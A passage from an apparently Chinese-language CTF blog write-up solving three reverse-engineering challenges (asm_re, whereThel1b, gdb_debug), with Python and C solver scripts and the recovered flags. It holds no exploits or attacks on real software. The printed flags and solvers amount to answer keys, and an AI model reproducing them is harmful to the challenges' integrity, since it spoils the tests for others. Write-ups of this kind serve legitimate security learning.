Reverseasm_re一开始还想还原这个ida工程文件hhh，发现根本做不到，后面纯看arm汇编代码，直接手撕就好，加密逻辑在这儿，密文一开始还找半天，后面发现应该是存在变量unk_100003F10里面 搓出脚本之后也还是卡了一小会儿，最后反应过来大小端的问题，改一下小端就好了，爆破一下直接出 exp: 12345678910111213k = [ 0x1fd7, 0x21b7, 0x1e47, 0x2027, 0x26e7, 0x10d7, 0x1127, 0x2007, 0x11c7, 0x1e47, 0x1017, 0x1017, 0x11f7, 0x2007, 0x1037, 0x1107, 0x1f17, 0x10d7, 0x1017, 0x1017, 0x1f67, 0x1017, 0x11c7, 0x11c7, 0x1017, 0x1fd7, 0x1f17, 0x1107, 0x0f47, 0x1127, 0x1037, 0x1e47, 0x1037, 0x1fd7, 0x1107, 0x1fd7, 0x1107, 0x2787]for i in range(len(k)): for j in range(128): if (((j * ord(&#x27;P&#x27;) + 0x14) ^ ord(&#x27;M&#x27;)) + 0x1e) == k[i]: print(chr(j), end=&quot;&quot;) #flag&#123;67e9a228e45b622c2992fb5174a4f5f5&#125; whereThel1b还真是第一次遇见这种，给了个so和一个py文件，一开始的想法是能不能给so解包之类的，因为py文件里面密文给了，就差一个加密逻辑，找了一大圈还是没找到，最后还是想到了调一下so文件，像调安卓那样 动调起来锁定出了两个函数，得知输入的数据先经过base64编码之后再进行的异或 加密逻辑知道了，但是不知道异或的值是什么，一开始以为是存在r18里面的，最后调了一下找不到规律，最后想到重新写一份密文输入，然后把加密之后的数据输出一下，前后异或得到所需异或的值，想办法输入一个输构造出经过base64编码之后长度为56的数 exp: 其中aa是上图构造的“55555555555555555555555555555555555555555555”的base64之后的值，然后bb是运行上图之后得到的异或之后的值，最后运行出来的结果解一下base64就行 12345678encry = [108, 117, 72, 80, 64, 49, 99, 19, 69, 115, 94, 93, 94, 115, 71, 95, 84, 89, 56, 101, 70, 2, 84, 75, 127, 68, 103, 85, 105, 113, 80, 103, 95, 67, 81, 7, 113, 70, 47, 73, 92, 124, 93, 120, 104, 108, 106, 17, 80, 102, 101, 75, 93, 68, 121, 26]aa = [78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49]bb = [120, 76, 101, 9, 84, 86, 69, 17, 81, 77, 103, 4, 93, 74, 67, 20, 67, 116, 93, 35, 70, 100, 83, 22, 125, 68, 119, 28, 125, 114, 92, 34, 72, 122, 81, 7, 101, 65, 75, 18, 72, 66, 78, 37, 105, 124, 88, 18, 80, 72, 98, 16, 94, 87, 102, 18]for i in range(len(aa)): print(chr(((aa[i]^bb[i]))^encry[i]),end=&#x27;&#x27;)#ZmxhZ3s3ZjlhMmQzYy0wN2RlLTExZWYtYmU1ZS1jZjFlODg2NzRjMGJ9 gdb_debug进入主函数之后逻辑还是相当清楚的，锁定了一下伪随机数 动调跑起来取出随机数 10xd9, 0x0f, 0x18, 0xBD, 0xC7, 0x16, 0x81, 0xbe, 0xf8, 0x4A, 0x65, 0xf2, 0x5D, 0xab, 0x74, 0x33, 0xd4, 0xa5, 0x67, 0x98, 0x9f, 0x7E, 0x2B, 0x5D, 0xc2, 0xaf, 0x8e, 0x3A, 0x4C, 0xa5, 0X75, 0X25, 0xb4, 0x8d, 0xe3, 0X7B, 0xa3, 0x64 然后直接从后往前逆就好 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;stdio.h&gt;int main() &#123; int indexArray[38]; int buffer[38]; int outputBuffer[38]; int originalNumbers[] = &#123; 94, 30, 2, 68, 157, 32, 134, 99, 227, 214, 182, 105, 24, 193, 153, 168, 188, 5, 121, 159, 25, 110, 218, 76, 117, 174, 192, 185, 247, 122, 149, 77, 23, 135, 148, 84, 191, 185 &#125;; unsigned char byteSequence[] = &#123; 128, 180, 64, 184, 148, 200, 52, 101, 238, 69, 215, 157, 60, 136, 140, 169, 107, 174, 125, 135, 214, 135, 15, 218, 70, 100, 57, 147, 169, 144, 184, 113, 131, 232, 172, 201, 231, 83 &#125;; unsigned int shuffledIndices[38]; for (int i = 0; i &lt; 38; i++) &#123; shuffledIndices[i] = originalNumbers[i] ^ byteSequence[i]; &#125; int encryptionKeys[] = &#123;0xd9, 0x0f, 0x18, 0xBD, 0xC7, 0x16, 0x81, 0xbe, 0xf8, 0x4A, 0x65, 0xf2, 0x5D, 0xab, 0x74, 0x33, 0xd4, 0xa5, 0x67, 0x98, 0x9f, 0x7E, 0x2B, 0x5D, 0xc2, 0xaf, 0x8e, 0x3A, 0x4C, 0xa5, 0x75, 0x25, 0xb4, 0x8d, 0xe3, 0x7B, 0xa3, 0x64&#125;; int permutationOrder[] = &#123;33, 0, 10, 0, 32, 31, 10, 29, 9, 24, 26, 11, 20, 24, 21, 3, 12, 10, 13, 2, 15, 4, 13, 10, 8, 3, 3, 6, 0, 4, 1, 1, 5, 4, 0, 0, 1&#125;; unsigned char dataXor[] = &#123;0xBF, 0xD7, 0x2E, 0xDA, 0xEE, 0xA8, 0x1A, 0x10, 0x83, 0x73, 0xAC, 0xF1, 0x06, 0xBE, 0xAD, 0x88, 0x04, 0xD7, 0x12, 0xFE, 0xB5, 0xE2, 0x61, 0xB7, 0x3D, 0x07, 0x4A, 0xE8, 0x96, 0xA2, 0x9D, 0x4D, 0xBC, 0x81, 0x8C, 0xE9, 0x88, 0x78&#125;; char inputData[] = &quot;congratulationstoyoucongratulationstoy&quot;; for (int i = 0; i &lt; 38; i++) &#123; indexArray[i] = i; &#125; for (int k = 37; k &gt; 0; --k) &#123; int swapIndex = permutationOrder[37 - k] % (k + 1); int tempIndex = indexArray[k]; indexArray[k] = indexArray[swapIndex]; indexArray[swapIndex] = tempIndex; &#125; for (int i = 0; i &lt; 38; i++) &#123; buffer[i] = shuffledIndices[i] ^ inputData[i] ^ dataXor[i]; outputBuffer[indexArray[i]] = encryptionKeys[indexArray[i]] ^ buffer[i]; &#125; for (int i = 0; i &lt; 38; i++) &#123; printf(&quot;%c&quot;, outputBuffer[i]); &#125; return 0;&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://m1racle-7.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://m1racle-7.github.io/tags/CTF/"}]}],"categories":[{"name":"CTF","slug":"CTF","permalink":"https://m1racle-7.github.io/categories/CTF/"},{"name":"linux","slug":"linux","permalink":"https://m1racle-7.github.io/categories/linux/"},{"name":"PHP","slug":"PHP","permalink":"https://m1racle-7.github.io/categories/PHP/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://m1racle-7.github.io/tags/CTF/"},{"name":"linux","slug":"linux","permalink":"https://m1racle-7.github.io/tags/linux/"},{"name":"PHP","slug":"PHP","permalink":"https://m1racle-7.github.io/tags/PHP/"}]}